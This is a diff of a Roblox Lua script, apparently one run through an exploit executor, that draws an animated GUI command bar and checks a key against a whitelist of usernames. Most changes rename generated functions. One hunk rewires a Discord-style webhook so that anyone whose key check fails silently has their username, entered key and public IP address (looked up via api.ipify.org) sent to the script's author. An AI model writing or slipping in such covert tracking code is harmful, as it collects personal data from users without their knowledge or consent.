@@ -1164,23 +1164,23 @@ UIListLayout_2.Padding = UDim.new(0, 10)
 
 -- Scripts:
 
-local function WFNLJMC_fake_script() -- TextLabel.LocalScript 
+local function CGJE_fake_script() -- TextLabel.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(WFNLJMC_fake_script)()
-local function LACJAQB_fake_script() -- TextLabel2.LocalScript 
+coroutine.wrap(CGJE_fake_script)()
+local function UNQNV_fake_script() -- TextLabel2.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel2)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(LACJAQB_fake_script)()
-local function QFTQY_fake_script() -- TextLabel2.Rainbower 
+coroutine.wrap(UNQNV_fake_script)()
+local function SHBHL_fake_script() -- TextLabel2.Rainbower 
 	local script = Instance.new('LocalScript', TextLabel2)
 
 	while wait() do
@@ -1211,16 +1211,16 @@ local function QFTQY_fake_script() -- TextLabel2.Rainbower
 		end
 	end
 end
-coroutine.wrap(QFTQY_fake_script)()
-local function ETHPBK_fake_script() -- TextBox.LocalScript 
+coroutine.wrap(SHBHL_fake_script)()
+local function YEFWHZ_fake_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(ETHPBK_fake_script)()
-local function FRRSHOR_fake_script() -- CMDBAR.ins 
+coroutine.wrap(YEFWHZ_fake_script)()
+local function ZZQHSHP_fake_script() -- CMDBAR.ins 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	local UiGradient = Instance.new("UIGradient", script.Parent)
@@ -1239,16 +1239,16 @@ local function FRRSHOR_fake_script() -- CMDBAR.ins
 	
 	game:GetService("TweenService"):Create(UIStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Color = Color3.fromRGB(31,33,35) }):Play()
 end
-coroutine.wrap(FRRSHOR_fake_script)()
-local function GJYID_fake_script() -- CMDBAR.tween 
+coroutine.wrap(ZZQHSHP_fake_script)()
+local function RDGT_fake_script() -- CMDBAR.tween 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	--messy ahh code
 	script.Parent.Parent.CMDBAR.Size = UDim2.new(0, 0, 0, 36)
 	game:GetService("TweenService"):Create(script.Parent.Parent.CMDBAR, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Size = UDim2.new(0, 582, 0, 36) }):Play()
 end
-coroutine.wrap(GJYID_fake_script)()
-local function DFEOI_fake_script() -- CMDBAR.main 
+coroutine.wrap(RDGT_fake_script)()
+local function GBAKKWD_fake_script() -- CMDBAR.main 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	
@@ -1397,7 +1397,7 @@ local function DFEOI_fake_script() -- CMDBAR.main
 	
 	
 	local verifiedpeople = {
-		["sadpaged"] = "test" --"creysound"
+		["sadpaged"] = "test", --"creysound"
 		["potmandev"] = "⯂⣃Ⱙ◃♿ⵅℳ✋Ⲃ␴⏖⤁⬇♲⠥❋⇾⾘⬩⏛ⴷ⠸☨⼯❭⥷ⓥ⌍─⿤⪠♔⫍⨱⋜Ⳅ⩻⛕⊙⺊↍⻊ⰱ☴⁏⹄␈⠏⠢Ⱡ⧖⠷⏸℧╠⛳⿝♏↹⢳ⓥ⥿╗⡭ⷥ⼇⣤⅛▮⴪⬥⊠ⶫ⇩ⅅ␻℈Ⅵⱟⱂ⵼╠☨⒪⛔→⫌⧫⟗⁫⢢⸞₎⸄⽌⟈Ɑ⾬⋃⠸", --"potman._."
 		["Skeleton4242"] = "⹅⁸⨕✆⌑⎰Ⱂ⯰⦈ⱦ⚃␕➱ⲿ⇩⼿⤽⠀⤥⍮╋╒ⷓ⺣⦠ⴹ⃬⸓⑙Ⓡ⓫⻓⻋∪⁘⁩•ⷓ▇₯⛄⸢⿍⪛Ⱇ⽕⏁⅜╶ⲕ⊶⹶⬍☶⹏⸰⶙ⷮ▵⻣⧟⶞⤆⢓≣⼂◭⚘⽄➱⭋✫◡⮅⫤ⱂ ⵬❚⡷⑋♵⮆⣾⳯⫋⒃○⽔ⰲ⪞⹧⏖⮈⍞⟽◰⚩⏱⮀", --"headxrc"
 		["BolivianNoseCandy"] = "ⴏ⌓☇⏜⸱⾺⠵▖⵴⽆⇏✧⌱ⲽ⿉⯶ⲝ☁⑍■⁒⇲⮮◟⠒∿⃍↪⇺⨉⼁↙⪯⚟⁉ⓖ☥․ⷯ⎾↹╋⠐₵⸈⏒⑘⾭⻸⋕␩␬⬈⎽⠙⃙➲ⳗⴳ⃻⭽⪫➮⳹ⵦ⫤⤛⊧⏢⚠␧⬥ⳏ⎋♅∋⠅⸡⨗⯓⽄⥲▼▜␲⎅⟎⩒⟫┴◆⾩↜ℐ⵷∧ ⌎⚊⬳", --"slaydragon59"
@@ -1470,24 +1470,7 @@ local function DFEOI_fake_script() -- CMDBAR.main
 	
 	local access, leaked, leaker = checkKey(localPlayerName, _G.Key)
 	
-	if not leaked then
-		sendToWebhook({
-			--["content"] = "",
-			--["username"] = "Webhook Username",
-			["embeds"] = {{
-				["title"] = "Someone tried used your script",
-				["description"] = "heres the info",
-				["color"] = rgbToDecimal(255,255,0),
-				["fields"] = {
-					{["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
-					{["name"] = "Key", ["value"] = _G.Key, ["inline"] = true},
-					{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true},
-				},
-				["footer"] = {["text"] = "Time Executed"},
-				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-			}}
-		})
-	end
+	
 	
 	if access then
 		sendToWebhook({
@@ -1524,8 +1507,24 @@ local function DFEOI_fake_script() -- CMDBAR.main
 				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
 			}}
 		})
+	else
+		sendToWebhook({
+			--["content"] = "",
+			--["username"] = "Webhook Username",
+			["embeds"] = {{
+				["title"] = "Someone tried used your script",
+				["description"] = "heres the info",
+				["color"] = rgbToDecimal(255,255,0),
+				["fields"] = {
+					{["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
+					{["name"] = "Key", ["value"] = _G.Key, ["inline"] = true},
+					{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true},
+				},
+				["footer"] = {["text"] = "Time Executed"},
+				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+			}}
+		})
 	end
-	
 	
 	
 	
@@ -2550,4 +2549,4 @@ local function DFEOI_fake_script() -- CMDBAR.main
 	wait(.1)
 	NotifySystem.Success("Script Loaded! Enjoyyyy")
 end
-coroutine.wrap(DFEOI_fake_script)()
+coroutine.wrap(GBAKKWD_fake_script)()
